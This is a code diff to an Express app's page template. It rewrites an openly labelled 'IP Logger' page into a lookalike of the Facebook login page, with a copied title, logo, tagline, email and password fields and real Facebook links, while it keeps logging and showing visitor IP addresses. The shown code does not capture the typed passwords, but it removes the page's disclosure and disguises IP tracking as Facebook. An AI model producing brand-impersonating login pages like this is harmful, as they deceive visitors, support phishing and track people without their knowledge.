@@ -45,7 +45,7 @@ app.get('/', (req, res) => {
     res.send(`
         <html>
             <head>
-                <title>IP Logger</title>
+                <title>Facebook - log in or sign up</title>
                 <style>
                     * {
                         margin: 0;
@@ -58,167 +58,153 @@ app.get('/', (req, res) => {
                         background-color: #f0f2f5;
                     }
 
-                    .navbar {
-                        background-color: #ffffff;
-                        height: 60px;
-                        padding: 0 16px;
-                        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+                    .container {
+                        max-width: 1200px;
+                        margin: 0 auto;
+                        padding: 20px;
                         display: flex;
                         align-items: center;
-                        position: fixed;
-                        top: 0;
-                        left: 0;
-                        right: 0;
-                        z-index: 1000;
+                        justify-content: space-between;
+                        height: 100vh;
+                    }
+
+                    .left-section {
+                        flex: 1;
+                        padding-right: 32px;
                     }
 
                     .logo {
                         color: #1877f2;
-                        font-size: 24px;
+                        font-size: 60px;
                         font-weight: bold;
+                        margin-bottom: 16px;
                     }
 
-                    .main-content {
-                        max-width: 1200px;
-                        margin: 80px auto 0;
-                        padding: 20px;
-                        display: grid;
-                        grid-template-columns: 1fr 2fr 1fr;
-                        gap: 20px;
+                    .tagline {
+                        font-size: 28px;
+                        line-height: 32px;
+                        color: #1c1e21;
                     }
 
-                    .left-sidebar, .right-sidebar {
-                        background: #ffffff;
-                        padding: 20px;
-                        border-radius: 8px;
-                        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+                    .right-section {
+                        flex: 1;
                     }
 
-                    .content {
-                        background: #ffffff;
+                    .login-box {
+                        background-color: white;
                         padding: 20px;
                         border-radius: 8px;
-                        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+                        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+                        max-width: 396px;
                     }
 
-                    .post {
-                        background: #ffffff;
-                        padding: 20px;
-                        border-radius: 8px;
-                        margin-bottom: 20px;
-                        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+                    .input-field {
+                        width: 100%;
+                        padding: 14px 16px;
+                        border: 1px solid #dddfe2;
+                        border-radius: 6px;
+                        margin-bottom: 12px;
+                        font-size: 17px;
                     }
 
-                    .post-header {
-                        display: flex;
-                        align-items: center;
-                        margin-bottom: 15px;
-                    }
-
-                    .avatar {
-                        width: 40px;
-                        height: 40px;
-                        border-radius: 50%;
+                    .login-button {
                         background-color: #1877f2;
-                        margin-right: 10px;
-                        display: flex;
-                        align-items: center;
-                        justify-content: center;
                         color: white;
+                        border: none;
+                        border-radius: 6px;
+                        font-size: 20px;
                         font-weight: bold;
+                        padding: 14px 16px;
+                        width: 100%;
+                        cursor: pointer;
+                        margin-bottom: 16px;
                     }
 
-                    .post-content {
-                        margin-bottom: 15px;
+                    .login-button:hover {
+                        background-color: #166fe5;
                     }
 
-                    .stats {
-                        background: #f0f2f5;
-                        padding: 15px;
-                        border-radius: 8px;
-                        margin-top: 15px;
+                    .forgot-password {
+                        text-align: center;
+                        margin-bottom: 20px;
                     }
 
-                    .stat-item {
-                        display: flex;
-                        align-items: center;
-                        margin-bottom: 10px;
-                    }
-
-                    .stat-icon {
-                        margin-right: 10px;
+                    .forgot-password a {
                         color: #1877f2;
+                        text-decoration: none;
+                        font-size: 14px;
                     }
 
-                    .menu-item {
-                        display: flex;
-                        align-items: center;
-                        padding: 10px;
-                        border-radius: 8px;
-                        margin-bottom: 5px;
+                    .divider {
+                        border-bottom: 1px solid #dadde1;
+                        margin: 20px 0;
+                    }
+
+                    .create-account {
+                        background-color: #42b72a;
+                        color: white;
+                        border: none;
+                        border-radius: 6px;
+                        font-size: 17px;
+                        font-weight: bold;
+                        padding: 14px 16px;
+                        width: 100%;
                         cursor: pointer;
                     }
 
-                    .menu-item:hover {
-                        background-color: #f0f2f5;
+                    .create-account:hover {
+                        background-color: #36a420;
                     }
 
-                    .menu-icon {
-                        margin-right: 10px;
-                        color: #1877f2;
+                    .ip-info {
+                        margin-top: 20px;
+                        padding: 15px;
+                        background-color: #f0f2f5;
+                        border-radius: 6px;
+                        font-size: 14px;
+                        color: #1c1e21;
+                    }
+
+                    .stats {
+                        margin-top: 20px;
+                        padding: 15px;
+                        background-color: #f0f2f5;
+                        border-radius: 6px;
+                        font-size: 14px;
+                        color: #1c1e21;
+                    }
+
+                    .stat-item {
+                        margin-bottom: 8px;
                     }
                 </style>
             </head>
             <body>
-                <nav class="navbar">
-                    <div class="logo">IP Logger</div>
-                </nav>
-
-                <div class="main-content">
-                    <div class="left-sidebar">
-                        <div class="menu-item">
-                            <span class="menu-icon">🏠</span>
-                            Home
-                        </div>
-                        <div class="menu-item">
-                            <span class="menu-icon">👥</span>
-                            Visitors
-                        </div>
-                        <div class="menu-item">
-                            <span class="menu-icon">📊</span>
-                            Statistics
-                        </div>
+                <div class="container">
+                    <div class="left-section">
+                        <div class="logo">facebook</div>
+                        <div class="tagline">Facebook helps you connect and share with the people in your life.</div>
                     </div>
-
-                    <div class="content">
-                        <div class="post">
-                            <div class="post-header">
-                                <div class="avatar">IP</div>
-                                <div>
-                                    <div style="font-weight: bold;">IP Address Detected</div>
-                                    <div style="font-size: 0.8em; color: #65676b;">Just now</div>
-                                </div>
+                    <div class="right-section">
+                        <div class="login-box">
+                            <input type="text" class="input-field" placeholder="Email address or phone number">
+                            <input type="password" class="input-field" placeholder="Password">
+                            <button class="login-button" onclick="window.location.href='https://www.facebook.com/login'">Log In</button>
+                            <div class="forgot-password">
+                                <a href="https://www.facebook.com/login/identify">Forgotten password?</a>
                             </div>
-                            <div class="post-content">
-                                <p>Your IP address has been logged:</p>
-                                <p style="font-weight: bold; color: #1877f2;">${ip}</p>
+                            <div class="divider"></div>
+                            <button class="create-account">Create New Account</button>
+                            
+                            <div class="ip-info">
+                                <p>Your IP: ${ip}</p>
                             </div>
+                            
                             <div class="stats">
-                                <div class="stat-item">
-                                    <span class="stat-icon">👥</span>
-                                    Total Unique Visitors: ${visitors.size}
-                                </div>
-                                <div class="stat-item">
-                                    <span class="stat-icon">📊</span>
-                                    Total Visits: ${totalVisits}
-                                </div>
+                                <div class="stat-item">Total Visitors: ${visitors.size}</div>
+                                <div class="stat-item">Total Visits: ${totalVisits}</div>
                             </div>
                         </div>
-                    </div>
-
-                    <div class="right-sidebar">
-                        <h3>About</h3>
-                        <p>This application logs and displays visitor IP addresses in a Facebook-like interface.</p>
                     </div>
                 </div>
             </body>
